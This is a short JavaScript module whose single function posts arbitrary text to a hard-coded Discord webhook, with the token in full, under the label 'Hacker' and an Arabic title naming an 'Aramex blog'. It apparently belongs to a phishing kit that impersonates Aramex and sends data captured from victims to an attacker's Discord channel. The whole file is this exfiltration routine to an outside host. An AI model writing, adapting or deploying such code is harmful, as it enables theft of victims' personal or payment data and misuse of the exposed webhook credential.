import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322524562025484308/hCCROC0BojjSuBk4etWrD8nx2iUuYRvnMhXCRfBnw5qSb5KoydKd9ufiQYppzEBqlsT2",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
